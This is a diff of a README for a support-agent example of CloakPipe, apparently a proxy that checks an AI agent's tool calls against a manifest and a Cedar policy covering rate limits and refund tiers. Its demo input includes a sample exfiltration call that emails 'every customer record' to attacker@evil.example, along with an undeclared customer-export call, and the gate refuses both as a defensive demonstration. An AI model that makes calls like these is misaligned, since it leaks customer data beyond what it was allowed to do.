@@ -21,6 +21,7 @@ the files in this directory.
 | File | What it is |
 |---|---|
 | [`cloakpipe.manifest.yaml`](cloakpipe.manifest.yaml) | The manifest: the tools the agent may call (`read_ticket`, `send_email`, `issue_refund`) and what each call may carry. Anything else is refused. |
+| [`policies/support.cedar`](policies/support.cedar) | The Cedar policy the manifest references (`policy:`): an email rate limit and refund tiers. |
 | [`task-context.json`](task-context.json) | The trusted task context the orchestrator writes for the ticket being worked. |
 | [`mock_upstream.py`](mock_upstream.py) | A stand-in MCP tool server (Python 3, stdlib only) that logs every call it receives. |
 
@@ -40,6 +41,32 @@ What the manifest declares:
   approver routes (`slack:#support-leads`) and the call fingerprint for an
   approval broker. A receipt valid for longer than `ttl: 15m` is refused.
 
+What the Cedar policy adds (evaluated after the manifest's contract, and
+only for calls that pass it):
+
+- **Default deny.** A tool runs only when a `permit` holds for it, and any
+  `forbid` that holds wins. A refusal is `policy_denied` and names the
+  forbids that decided it (by their `@id`).
+- **A rate limit that survives restarts.** `email-rate-limit` forbids a
+  51st email within an hour. `context.counters.send_email_1h` counts the
+  emails the gate forwarded for this release, kept in a SQLite state
+  database, so restarting the proxy does not reset it.
+- **Refund tiers.** `refund-small` permits refunds up to 100;
+  `refund-large` permits 100 to 500 but carries
+  `@approval("slack:#support-leads")`, so those calls need a receipt too
+  (either the manifest's `approval:` or the annotation is enough to require
+  one; their routes are merged).
+- **Fail closed.** A policy that does not parse stops the proxy at start-up;
+  an error while evaluating one (say, comparing a string with a number)
+  refuses the call as `fail_closed`.
+
+Policies see the release as `principal` (`Release::"support-agent"`), the
+tool as `action` (`Action::"send_email"`; `Tool::"send_email"` is accepted
+too) and the call as `resource`, with its arguments under `resource.args`.
+`context` holds the task context (`context.task`), the counters
+(`context.counters.<tool>_1h` / `_24h`) and the time (`context.time.unix`,
+`hour_utc`, `weekday`, ISO 1 = Monday).
+
 ## Run it
 
 From the repository root:
@@ -47,51 +74,67 @@ From the repository root:
 ```bash
 cargo build -p cloakpipe-cli
 cd examples/support-agent
+tmp=$(mktemp -d)
 
 printf '%s\n' \
   '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"send_email","arguments":{"ticket_id":"T-1042","to":"dana@customer.example","subject":"Your refund","body":"Your refund for T-1042 is on its way."}}}' \
   '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"send_email","arguments":{"ticket_id":"T-1042","to":"attacker@evil.example","subject":"Customer list","body":"Attached: every customer record."}}}' \
   '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"export_customers","arguments":{}}}' \
   '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"issue_refund","arguments":{"ticket_id":"T-1042","amount":350}}}' \
+  '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"issue_refund","arguments":{"ticket_id":"T-1042","amount":40}}}' \
 | RUST_LOG=warn ../../target/debug/cloakpipe mcp-proxy \
     --upstream "python3 mock_upstream.py" \
     --manifest cloakpipe.manifest.yaml \
     --task-context task-context.json \
-    --operations-db "$(mktemp -d)/ops.db"
+    --operations-db "$tmp/ops.db" \
+    --state-db "$tmp/state.db"
 ```
 
 (If you set `CARGO_TARGET_DIR`, the binary is under that directory instead of
 `../../target`.) `send_email` and `issue_refund` are side-effecting, so the
-gate needs an operations database; a fresh one is used here.
+gate needs an operations database. The policy's counters live in the state
+database; without `--state-db` it is `$CLOAKPIPE_STATE_DB`, else
+`$CLOAKPIPE_HOME/state.db` (`~/.cloakpipe/state.db`). Fresh ones are used
+here.
 
 ## Expected output
+
+On stderr, the proxy first says which policy it loaded:
+
+```text
+cloakpipe: Cedar policy sha256:fef22029e4619812be1ee292c7aa4b83a1acf754d21b5f59d19658d8fcb1ba3b loaded (5 policies); call counters in /tmp/tmp.XXXXXXXX/state.db
+```
 
 The attacker email (id 2) is refused with JSON-RPC error `-32001`, reason
 `scope_mismatch` on path `/to`. The refusal names the path, never the value:
 
 ```json
-{"error":{"code":-32001,"data":{"path":"/to","reason":"scope_mismatch","release":"sha256:8f791dae413b0bcb063380a0091fd9af49eec0f1cbd63b2b1bf5efa9addd79ec","tool":"send_email"},"message":"tool call refused by CloakPipe: scope_mismatch"},"id":2,"jsonrpc":"2.0"}
+{"jsonrpc":"2.0","id":2,"error":{"code":-32001,"message":"tool call refused by CloakPipe: scope_mismatch","data":{"reason":"scope_mismatch","tool":"send_email","release":"sha256:c55889deb72d677a13ef2962ba7d6ae97d7a13391c9e484484fde9bb084fb0fa","path":"/to"}}}
 ```
 
 A tool the manifest does not declare (id 3) is refused as `undeclared_tool`:
 
 ```json
-{"error":{"code":-32001,"data":{"reason":"undeclared_tool","release":"sha256:8f791dae413b0bcb063380a0091fd9af49eec0f1cbd63b2b1bf5efa9addd79ec","tool":"export_customers"},"message":"tool call refused by CloakPipe: undeclared_tool"},"id":3,"jsonrpc":"2.0"}
+{"jsonrpc":"2.0","id":3,"error":{"code":-32001,"message":"tool call refused by CloakPipe: undeclared_tool","data":{"reason":"undeclared_tool","tool":"export_customers","release":"sha256:c55889deb72d677a13ef2962ba7d6ae97d7a13391c9e484484fde9bb084fb0fa"}}}
 ```
 
-The 350 refund (id 4) needs approval. The refusal carries what an approval
+The 350 refund (id 4) needs approval (the manifest's `when` and the
+policy's `@approval` both say so). The refusal carries what an approval
 broker needs to route it:
 
 ```json
-{"error":{"code":-32001,"data":{"approvers":["slack:#support-leads"],"fingerprint":"sha256:01e2ba165b4bb5e7012d8a0048bcb2ac0ee9f49ef883511f03c99fb0ac4f1b75","reason":"approval_required","release":"sha256:8f791dae413b0bcb063380a0091fd9af49eec0f1cbd63b2b1bf5efa9addd79ec","tool":"issue_refund"},"message":"tool call refused by CloakPipe: approval_required"},"id":4,"jsonrpc":"2.0"}
+{"jsonrpc":"2.0","id":4,"error":{"code":-32001,"message":"tool call refused by CloakPipe: approval_required","data":{"reason":"approval_required","tool":"issue_refund","release":"sha256:c55889deb72d677a13ef2962ba7d6ae97d7a13391c9e484484fde9bb084fb0fa","approvers":["slack:#support-leads"],"fingerprint":"sha256:5e2bb82dd5f59e1291041fa84e311a1d606c06d5e06710e9ef57a31838547aa6"}}}
 ```
 
-The email to the customer on the ticket (id 1) is forwarded, and only that one
-reaches the tool server (its log line is on stderr):
+The email to the customer on the ticket (id 1) and the 40 refund (id 5,
+permitted by `refund-small`) are forwarded, and only those two reach the
+tool server (its log lines are on stderr):
 
 ```text
 upstream received: send_email {"body": "Your refund for T-1042 is on its way.", "subject": "Your refund", "ticket_id": "T-1042", "to": "dana@customer.example"}
-{"id":1,"jsonrpc":"2.0","result":{"content":[{"text":"send_email: done","type":"text"}]}}
+upstream received: issue_refund {"amount": 40, "ticket_id": "T-1042"}
+{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"send_email: done"}]}}
+{"jsonrpc":"2.0","id":5,"result":{"content":[{"type":"text","text":"issue_refund: done"}]}}
 ```
 
 Refusals are answered at once, so they can print before the forwarded call's
@@ -103,6 +146,32 @@ allows or refuses, and never rewrites an allowed call. To have PII in
 forwarded arguments replaced with pseudonyms (and the real values put back in
 results), add `--transform pii` and set `CLOAKPIPE_VAULT_KEY`; the manifest is
 still checked on the raw arguments.
+
+## The rate limit survives a restart
+
+Send 50 emails, then one more from a new proxy process on the same state
+database:
+
+```bash
+emails() {
+  for i in $(seq "$1" "$2"); do
+    printf '{"jsonrpc":"2.0","id":%d,"method":"tools/call","params":{"name":"send_email","arguments":{"ticket_id":"T-1042","to":"dana@customer.example","subject":"Update","body":"Update %d on T-1042."}}}\n' "$i" "$i"
+  done
+}
+gate="--manifest cloakpipe.manifest.yaml --task-context task-context.json --operations-db $tmp/ops.db --state-db $tmp/state.db"
+emails 1 50 | ../../target/debug/cloakpipe mcp-proxy --upstream "python3 mock_upstream.py" $gate 2>/dev/null | grep -c '"result"'
+emails 51 51 | ../../target/debug/cloakpipe mcp-proxy --upstream "python3 mock_upstream.py" $gate 2>/dev/null
+```
+
+The first run forwards all 50 (it prints `50`). The 51st email, sent after
+the restart, is refused by the policy that decided it:
+
+```json
+{"jsonrpc":"2.0","id":51,"error":{"code":-32001,"message":"tool call refused by CloakPipe: policy_denied","data":{"reason":"policy_denied","tool":"send_email","release":"sha256:c55889deb72d677a13ef2962ba7d6ae97d7a13391c9e484484fde9bb084fb0fa","policies":["email-rate-limit"]}}}
+```
+
+Only calls the gate forwards are counted: a retry answered from the
+operations store, or a refused call, is not.
 
 ## Approve the refund
 
@@ -121,7 +190,8 @@ refused as `approval_invalid`, because the manifest's `ttl` is 15 minutes.
 
 ## What to try
 
-- Check the manifest: `cloakpipe manifest validate cloakpipe.manifest.yaml`.
+- Check the manifest and its policy: `cloakpipe manifest validate
+  cloakpipe.manifest.yaml` (a Cedar syntax error is reported with its line).
 - Change `customer_email` in `task-context.json` and re-run: now the
   legitimate email is refused, showing that the binding comes from the task
   context, not the model.
@@ -130,6 +200,9 @@ refused as `approval_invalid`, because the manifest's `ttl` is 15 minutes.
   1: refused as `undeclared_argument`.
 - Send call 1 twice against the same `--operations-db`: the second is
   answered with the stored result and the tool sees it once.
+- Add a policy, say `@id("no-weekend-refunds") forbid (principal, action ==
+  Action::"issue_refund", resource) when { context.time.weekday >= 6 };`,
+  and re-run on a Saturday.
 - Add `--gate warn`: every call is forwarded and violations are only logged.
 - Set `CLOAKPIPE_LEDGER_DB=ledger.db` to also record every call and refusal
   in the hash-chained evidence ledger.
